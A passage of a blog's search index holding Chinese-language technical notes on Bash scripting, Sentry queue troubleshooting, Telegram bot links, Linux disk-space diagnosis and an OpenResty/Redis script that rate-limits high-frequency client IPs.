直接使用函数名称即可，前面可选的添加function function_name function_name(){ # 使用$#,$*,$@以及$0-$n获取函数名以及其它参数 val=\u0026quot;$1\u0026quot; # 带返回值，可选，返回值只能是整数（状态码） # 如果要返回结果的话，使用全局变量 return $val } 函数调用\n# 调用函数直接使用函数名称即可，后面可以空格隔开使用多个参数 function_name 1 2 3 4 # 使用$?变量获取返回值 ret=$? 常用代码片段 列出目录下的所有文件 下面的代码列出了 downloads 目录下所有的 xlsx 文件，这里要注意的是，如果要列出所有文件，使用\u0026quot;$watch_dir\u0026quot;/*这种形式。\nwatch_dir=\u0026quot;/Users/mylxsw/Downloads\u0026quot; # 避免目录下没有匹配文件时返回带有*的结果 shopt -s nullglob for file in \u0026quot;$watch_dir\u0026quot;/*.xlsx do echo $file done for file in \u0026quot;$watch_dir\u0026quot;/*/ # 列出所有目录 do echo $file done 参考 How to get the list of files in a directory in a shell script? 和 Bash Shell Loop Over Set of Files\n从标准输入循环读取 while read line do if [ $line != 'EOF' ] then echo $line fi done 日期时间处理 获取当前日期 # 输出: 20161023 echo $(date +%Y%m%d) 时间比较 时间比较可以先转换为 UNIX 时间戳，然后直接比较时间戳大小即可。\ntime1=`date +%s` time2=`date -d '2016-10-25 17:20:13' +%s` if [ $time1 -gt $time2 ]; then echo \u0026quot;time1 \u0026gt; time2\u0026quot; else echo \u0026quot;time1 \u0026lt; time2\u0026quot; fi ","date":"August 7, 2019","hero":"/images/hero/shell.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190807-mylxsw-growing-up-shell/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/mylxsw/growing-up/blob/master/doc/Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md\" target=\"_blank\" rel=\"noopener\"\u003eShell 脚本学习笔记\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"执行算术运算\"\u003e执行算术运算\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003eval=`expr $a + $b`\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"运算符\"\u003e运算符\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e符号\u003c/th\u003e\n          \u003cth\u003e说明\u003c/th\u003e\n          \u003cth\u003e示例\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e!\u003c/td\u003e\n          \u003ctd\u003e非运算\u003c/td\u003e\n          \u003ctd\u003e[ ! false ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-o\u003c/td\u003e\n          \u003ctd\u003e或运算\u003c/td\u003e\n          \u003ctd\u003e[ $a -lt 20 -o $b -gt 20 ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-a\u003c/td\u003e\n          \u003ctd\u003e与运算\u003c/td\u003e\n          \u003ctd\u003e[ $a -lt 20 -a $b -gt 20 ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e=\u003c/td\u003e\n          \u003ctd\u003e相等检测\u003c/td\u003e\n          \u003ctd\u003e[ $a = $b ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e!=\u003c/td\u003e\n          \u003ctd\u003e不相等检测\u003c/td\u003e\n          \u003ctd\u003e[ $a != $b ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-z\u003c/td\u003e\n          \u003ctd\u003e字符串长度是否为 0，为 0 则返回 true\u003c/td\u003e\n          \u003ctd\u003e[ -z $a ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-n\u003c/td\u003e\n          \u003ctd\u003e字符串长度不为 0， 不为 0 返回 true\u003c/td\u003e\n          \u003ctd\u003e[ -n $a ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003estr\u003c/td\u003e\n          \u003ctd\u003e检测字符串是否为空，不为空返回 true\u003c/td\u003e\n          \u003ctd\u003e[ $a ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-b\u003c/td\u003e\n          \u003ctd\u003e检测文件是否是块设备文件\u003c/td\u003e\n          \u003ctd\u003e[ -b $file ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-c\u003c/td\u003e\n          \u003ctd\u003e检测文件是否是字符设备\u003c/td\u003e\n          \u003ctd\u003e..\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-d\u003c/td\u003e\n          \u003ctd\u003e检测文件是否为目录\u003c/td\u003e\n          \u003ctd\u003e[ -d $file ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-f\u003c/td\u003e\n          \u003ctd\u003e检测文件是否为普通文件\u003c/td\u003e\n          \u003ctd\u003e[ -f $file ]\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-r\u003c/td\u003e\n          \u003ctd\u003e检测文件是否可读\u003c/td\u003e\n          \u003ctd\u003e..\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-w\u003c/td\u003e\n          \u003ctd\u003e检测文件是否可写\u003c/td\u003e\n          \u003ctd\u003e..\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-x\u003c/td\u003e\n          \u003ctd\u003e检测文件是否可执行\u003c/td\u003e\n          \u003ctd\u003e..\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-s\u003c/td\u003e\n          \u003ctd\u003e检测文件是否为空\u003c/td\u003e\n          \u003ctd\u003e..\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e-e\u003c/td\u003e\n          \u003ctd\u003e检测文件是否存在\u003c/td\u003e\n          \u003ctd\u003e..\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"特殊变量\"\u003e特殊变量\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e变量\u003c/th\u003e\n          \u003cth\u003e含义\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e$0\u003c/td\u003e\n          \u003ctd\u003e当前脚本的文件名\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e$n\u003c/td\u003e\n          \u003ctd\u003e传递给脚本或函数的参数。n 是一个数字，表示第几个参数\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e$#\u003c/td\u003e\n          \u003ctd\u003e传递给脚本或函数的参数个数\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e$*\u003c/td\u003e\n          \u003ctd\u003e传递给脚本或函数的所有参数，所有参数被当做一个词，例如 \u0026ldquo;1 2 3\u0026rdquo;\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e$@\u003c/td\u003e\n          \u003ctd\u003e传递给脚本或函数的所有参数，每个参数当做一个词，用双引号包含，例如\u0026quot;1\u0026quot; \u0026ldquo;2\u0026rdquo; \u0026ldquo;3\u0026rdquo;\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e$?\u003c/td\u003e\n          \u003ctd\u003e上个命令的退出状态，或函数的返回值\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e$$\u003c/td\u003e\n          \u003ctd\u003e当前 Shell 进程 ID。对于 Shell 脚本，就是这些脚本所在的进程 ID\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"posix-程序退出状态\"\u003ePOSIX 程序退出状态\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e状态码\u003c/th\u003e\n          \u003cth\u003e含义\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e0\u003c/td\u003e\n          \u003ctd\u003e命令成功退出\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u0026gt; 0\u003c/td\u003e\n          \u003ctd\u003e在重定向或者单词展开期间(~、变量、命令、算术展开以及单词切割)失败\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e1 - 125\u003c/td\u003e\n          \u003ctd\u003e命令不成功退出。特定的退出值的含义，有各个命令自行定义\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e126\u003c/td\u003e\n          \u003ctd\u003e命令找到了，但是文件无法执行\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e127\u003c/td\u003e\n          \u003ctd\u003e命令没有找到\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u0026gt; 128\u003c/td\u003e\n          \u003ctd\u003e命令因收到信号而死亡\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"输入输出重定向\"\u003e输入输出重定向\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e命令\u003c/th\u003e\n          \u003cth\u003e说明\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ecommand \u0026gt; file\u003c/td\u003e\n          \u003ctd\u003e将输出重定向到 file。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ecommand \u0026gt; file\u003c/td\u003e\n          \u003ctd\u003e将输出以追加的方式重定向到 file。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003en \u0026gt; file\u003c/td\u003e\n          \u003ctd\u003e将文件描述符为 n 的文件重定向到 file。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003en \u0026raquo; file\u003c/td\u003e\n          \u003ctd\u003e将文件描述符为 n 的文件以追加的方式重定向到 file。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003en \u0026gt;\u0026amp; m\u003c/td\u003e\n          \u003ctd\u003e将输出文件 m 和 n 合并。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003en \u0026lt;\u0026amp; m\u003c/td\u003e\n          \u003ctd\u003e将输入文件 m 和 n 合并。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u0026laquo; tag\u003c/td\u003e\n          \u003ctd\u003e将开始标记 tag 和结束标记 tag 之间的内容作为输入。\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"文件包含\"\u003e文件包含\u003c/h3\u003e\n\u003cp\u003e使用\u003ccode\u003e.\u003c/code\u003e或者\u003ccode\u003esource\u003c/code\u003e包含文件\u003c/p\u003e","tags":["URL","SHELL"],"title":"Shell脚本学习笔记"},{"categories":["URL","Sentry"],"contents":" Excessive Errors from sentry.lang.javascript.processor: SoftTimeLimitExceeded() Counters-0 queue is rising continuously Excessive Errors from sentry.lang.javascript.processor: SoftTimeLimitExceeded() mattrobenolt:\nWas just going to propose this. :) Unfortunately, this is just how this feature works. If it\u0026rsquo;s not useful and is just wasting resources, it\u0026rsquo;s easy to disable globally by setting SENTRY_SCRAPE_JAVASCRIPT_CONTEXT = False in your sentry.conf.py or per project in the UI.\nOther than that, there\u0026rsquo;s not much else we can do here since the feature is effectively working as intended.\nCounters-0 queue is rising continuously matt:\nYou need more workers on this queue to process the load.\nYou can run workers dedicated to a certain queue too that might help, doing sentry run worker -Q counters-0\n","date":"July 25, 2019","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190725-getsentry-sentry-issues-4386/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/getsentry/sentry/issues/4386\" target=\"_blank\" rel=\"noopener\"\u003eExcessive Errors from \u003ccode\u003esentry.lang.javascript.processor: SoftTimeLimitExceeded()\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://forum.sentry.io/t/counters-0-queue-is-rising-continuously/5655/6\" target=\"_blank\" rel=\"noopener\"\u003eCounters-0 queue is rising continuously\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"excessive-errors-from-sentrylangjavascriptprocessor-softtimelimitexceeded\"\u003eExcessive Errors from \u003ccode\u003esentry.lang.javascript.processor: SoftTimeLimitExceeded()\u003c/code\u003e\u003c/h4\u003e\n\u003cp\u003emattrobenolt:\u003c/p\u003e\n\u003cp\u003eWas just going to propose this. :) Unfortunately, this is just how this feature works. If it\u0026rsquo;s not useful and is just wasting resources, it\u0026rsquo;s easy to disable globally by setting \u003ccode\u003eSENTRY_SCRAPE_JAVASCRIPT_CONTEXT = False\u003c/code\u003e in your \u003ccode\u003esentry.conf.py\u003c/code\u003e or per project in the UI.\u003c/p\u003e\n\u003cp\u003eOther than that, there\u0026rsquo;s not much else we can do here since the feature is effectively working as intended.\u003c/p\u003e","tags":["URL","Sentry"],"title":"Excessive Errors from `sentry.lang.javascript.processor: SoftTimeLimitExceeded()`"},{"categories":["URL","Python","Telegram"],"contents":" （一）一步步打造 Telegram Bot （二）為 Chatbot 增加 NLP 功能 （三）為 Chatbot 添加新技能 Python Telegram Bot 教學 用 Python 写一个简单的 Telegram Bot https://github.com/python-telegram-bot/python-telegram-bot/wiki/Code-snippets ","date":"July 11, 2019","hero":"/images/hero/python.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190711-python-telegram-bot/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://zaoldyeck.medium.com/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E6%80%8E%E9%BA%BC%E6%89%93%E9%80%A0-telegram-bot-a7b539c3402a\" target=\"_blank\" rel=\"noopener\"\u003e（一）一步步打造 Telegram Bot\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://zaoldyeck.medium.com/%E5%88%A9%E7%94%A8-olami-open-api-%E7%82%BA-chatbot-%E5%A2%9E%E5%8A%A0-nlp-%E5%8A%9F%E8%83%BD-e6b37940913d\" target=\"_blank\" rel=\"noopener\"\u003e（二）為 Chatbot 增加 NLP 功能\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://zaoldyeck.medium.com/add-custom-skill-into-chatbot-cef9bfeeef52\" target=\"_blank\" rel=\"noopener\"\u003e（三）為 Chatbot 添加新技能\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://hackmd.io/@truckski/HkgaMUc24\" target=\"_blank\" rel=\"noopener\"\u003ePython Telegram Bot 教學\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://kaive.me/2018/07/15/Python-telegram-bot/\" target=\"_blank\" rel=\"noopener\"\u003e用 Python 写一个简单的 Telegram Bot\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/python-telegram-bot/python-telegram-bot/wiki/Code-snippets\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/python-telegram-bot/python-telegram-bot/wiki/Code-snippets\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Python","Telegram"],"title":"Python Telegram Bot"},{"categories":["URL","Linux"],"contents":" linux 磁碟空間沒釋放的解決方法 用 df -ah 命令 du -h --max-depth=1 du 之和遠遠小於 df 得到的總量\n程序使用的檔案資源被刪除後，程序還活著，導致檔案未被真正刪除，無法釋放磁碟空間，卻並不能被統計到。\nlsof |grep delete\n","date":"July 10, 2019","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190710-linux-command-line-du-dh-lsof/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.itread01.com/content/1542767890.html\" target=\"_blank\" rel=\"noopener\"\u003elinux 磁碟空間沒釋放的解決方法\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"用-df--ah-命令-du--h---max-depth1\"\u003e用 \u003ccode\u003edf -ah\u003c/code\u003e 命令 \u003ccode\u003edu -h --max-depth=1\u003c/code\u003e\u003c/h5\u003e\n\u003cp\u003e\u003ccode\u003edu\u003c/code\u003e 之和遠遠小於 \u003ccode\u003edf\u003c/code\u003e 得到的總量\u003c/p\u003e\n\u003cp\u003e程序使用的檔案資源被刪除後，程序還活著，導致檔案未被真正刪除，無法釋放磁碟空間，卻並不能被統計到。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003elsof |grep delete\u003c/code\u003e\u003c/p\u003e","tags":["URL","Linux"],"title":"linux磁碟空間沒釋放的解決方法"},{"categories":["URL","Sentry","Python"],"contents":" Sentry 源码开发笔记 Formatting uWSGI requests logs PostgreSQL: Documentation: 9.3: The Password File ","date":"July 3, 2019","hero":"/images/hero/python.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190703-python-sentry-develop-notes-and-uwsgi-log-format/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://chroming.gitlab.io/2018/09/26/edit_sentry_source_code/\" target=\"_blank\" rel=\"noopener\"\u003eSentry 源码开发笔记\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://uwsgi-docs.readthedocs.io/en/latest/LogFormat.html\" target=\"_blank\" rel=\"noopener\"\u003eFormatting uWSGI requests logs\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.postgresql.org/docs/9.3/libpq-pgpass.html\" target=\"_blank\" rel=\"noopener\"\u003ePostgreSQL: Documentation: 9.3: The Password File\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Sentry","Python"],"title":"Sentry 源码开发笔记"},{"categories":["URL","OpenResty","Redis","Lua"],"contents":" openresty+redis 拦截高频访问 IP init_by_lua_block { redis = require \u0026#34;redis\u0026#34; client = redis.connect(\u0026#39;127.0.0.1\u0026#39;, 6379) } server { listen 8080; location / { access_by_lua_file /usr/local/nginx/conf/lua/block.lua; proxy_pass http://192.168.1.102:8000; } } -- Redis-based IP rate limiting / blocking for OpenResty (ngx_lua) -- NOTE: -- This script assumes a global `client` variable is used/stored. -- Make sure `redis` module is available and `client` is initialized somewhere. local function isConnected() return client:ping() end local function createRedisConnection() return redis.connect(\u0026#34;127.0.0.1\u0026#34;, 6379) end -- 如果发生 redis 连接失败，将停止拦截（直接放行） if pcall(isConnected) then -- already connected (or ping succeeded) else -- not connected; try reconnect if pcall(createRedisConnection) then -- 断开重连：会导致每次访问都需要重连 redis -- 访问量大时建议：关闭重连逻辑（pcall 不执行），直接 ngx.exit 放行/终止 client = createRedisConnection() else ngx.exit(ngx.OK) end end local ttl = 60 -- 监测周期（秒） local bktimes = 30 -- 在监测周期内达到触发拦截的访问量 local block_ttl = 600 -- 触发拦截后拦截时间（秒） local ip = ngx.var.remote_addr local ipvtimes = client:get(ip) if ipvtimes then if ipvtimes == \u0026#34;-1\u0026#34; then -- blocked return ngx.exit(403) else local last_ttl = client:ttl(ip) -- ngx.say(\u0026#34;key exist.ttl is \u0026#34;, last_ttl) if last_ttl == -1 then client:set(ip, 0) client:expire(ip, ttl) -- ngx.say(\u0026#34;ttl \u0026amp; vtimes recount\u0026#34;) return ngx.exit(ngx.OK) end local vtimes = tonumber(client:get(ip)) + 1 if vtimes \u0026lt; bktimes then client:set(ip, vtimes) client:expire(ip, last_ttl) -- ngx.say(ip, \u0026#34; view \u0026#34;, vtimes, \u0026#34; times\u0026#34;) return ngx.exit(ngx.OK) else -- ngx.say(ip, \u0026#34; will be block next time.\u0026#34;) client:set(ip, -1) client:expire(ip, block_ttl) return ngx.exit(ngx.OK) end end else -- key does not exist client:set(ip, 1) -- ngx.say(ip, \u0026#34; view 1 times\u0026#34;) client:expire(ip, ttl) return ngx.exit(ngx.OK) end ","date":"June 27, 2019","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190627-openrestyredis/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.centos.bz/2018/11/openrestyredis%E6%8B%A6%E6%88%AA%E9%AB%98%E9%A2%91%E8%AE%BF%E9%97%AEip/\" target=\"_blank\" rel=\"noopener\"\u003eopenresty+redis 拦截高频访问 IP\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003einit_by_lua_block\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eredis\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003erequire\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;redis\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003eclient\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003eredis.connect(\u0026#39;127.0.0.1\u0026#39;,\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e6379\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8080\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eaccess_by_lua_file\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/local/nginx/conf/lua/block.lua\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eproxy_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ehttp://192.168.1.102:8000\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e-- Redis-based IP rate limiting / blocking for OpenResty (ngx_lua)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e-- NOTE:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e-- This script assumes a global `client` variable is used/stored.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e-- Make sure `redis` module is available and `client` is initialized somewhere.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eisConnected\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e client:ping()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecreateRedisConnection\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e redis.connect(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;127.0.0.1\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e6379\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e-- 如果发生 redis 连接失败，将停止拦截（直接放行）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e pcall(isConnected) \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e-- already connected (or ping succeeded)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e-- not connected; try reconnect\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e pcall(createRedisConnection) \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e-- 断开重连：会导致每次访问都需要重连 redis\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e-- 访问量大时建议：关闭重连逻辑（pcall 不执行），直接 ngx.exit 放行/终止\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        client \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e createRedisConnection()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 